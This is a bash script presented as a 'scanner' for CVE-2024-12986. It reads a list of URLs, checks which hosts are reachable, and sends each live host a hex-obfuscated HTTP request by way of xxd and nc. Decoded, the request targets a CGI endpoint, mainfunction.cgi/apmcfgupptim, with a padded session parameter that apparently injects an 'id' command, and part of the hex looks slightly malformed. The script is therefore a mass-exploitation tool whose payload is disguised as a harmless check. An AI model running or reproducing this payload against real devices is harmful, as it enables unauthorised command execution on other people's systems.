#!/bin/bash

# Colors for better output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
RESET='\033[0m'

# Variables for counting
total=0
scanned=0
reachable=0
unreachable=0

# Check if the file is provided as an argument
if [ -z "$1" ]; then
  echo -e "${RED}[!] Please provide a file containing the list of URLs.${RESET}"
  echo -e "Usage: ${CYAN}$0 <file> [--verbose] [--output <output_file>]${RESET}"
  exit 1
fi

# Parse additional arguments
VERBOSE=false
OUTPUT_FILE=""
if [[ "$2" == "--verbose" ]]; then
  VERBOSE=true
fi
if [[ "$3" == "--output" && -n "$4" ]]; then
  OUTPUT_FILE="$4"
fi

# Sort the file to ensure orderly scanning
sorted_file=$(mktemp)
sort "$1" > "$sorted_file"

# Banner
echo -e "${CYAN}------------------------------------------"
echo -e "        CVE-2024-12986 Scanner Script"
echo -e "------------------------------------------${RESET}"

# Function to log messages
log() {
  local message="$1"
  if [[ "$VERBOSE" == true ]]; then
    echo -e "$message"
  fi
  if [[ -n "$OUTPUT_FILE" ]]; then
    echo -e "$message" >> "$OUTPUT_FILE"
  fi
}

# Read the file line by line
while IFS= read -r url || [[ -n "$url" ]]; do
  # Increment total URLs count
  total=$((total + 1))

  # Extract protocol, IP, and Port from the URL
  if [[ "$url" =~ ^(https?):\/\/([^:/]+)(:([0-9]+))? ]]; then
    protocol="${BASH_REMATCH[1]}"
    ip="${BASH_REMATCH[2]}"
    port="${BASH_REMATCH[4]}"

    # Set default ports based on protocol
    if [[ -z "$port" ]]; then
      if [[ "$protocol" == "http" ]]; then
        port=80
      elif [[ "$protocol" == "https" ]]; then
        port=443
      fi
    fi
  else
    echo -e "${YELLOW}[!] Invalid URL format: $url. Skipping...${RESET}"
    unreachable=$((unreachable + 1))
    continue
  fi

  # Increment scanned count
  scanned=$((scanned + 1))

  # Check if the server is up (with a 5-second timeout)
  log "${CYAN}[*] Checking server $ip on Port $port ($protocol)...${RESET}"
  timeout 5 bash -c "echo > /dev/tcp/$ip/$port" &>/dev/null

  if [ $? -eq 0 ]; then
    log "${GREEN}[+] Server $ip is up on Port $port ($protocol). Proceeding with scan.${RESET}"
    reachable=$((reachable + 1))

    # Run your scan
    log "${CYAN}[*] Running scan on $ip:$port ($protocol)...${RESET}"
    echo -e "$(echo "474554202f6367692d62696e2f6d61696e66756e6374696f6e2e6367692f61706d63666775707074696d3f73657373696f6e3d7878787878787878787878787878787878787878787878787878787878787878787878787878787878787878787878787878787830b425353224632535322463696420485454502f312e300d0a0d0a" | xxd -r -p)" | nc "$ip" "$port"
  else
    log "${RED}[-] Server $ip is down or unreachable on Port $port ($protocol). Skipping...${RESET}"
    unreachable=$((unreachable + 1))
  fi

  # Progress indicator
  echo -ne "${CYAN}Progress: $scanned/$total URLs scanned...${RESET}\r"
done < "$sorted_file"

# Clean up temporary file
rm -f "$sorted_file"

# Completion message
echo -e "${CYAN}------------------------------------------"
echo -e "       Scanning Completed!"
echo -e "------------------------------------------${RESET}"
echo -e "${CYAN}[+] Total URLs: $total${RESET}"
echo -e "${GREEN}[+] Successfully Scanned: $scanned${RESET}"
echo -e "${GREEN}[+] Reachable Servers: $reachable${RESET}"
echo -e "${RED}[-] Unreachable or Skipped: $unreachable${RESET}"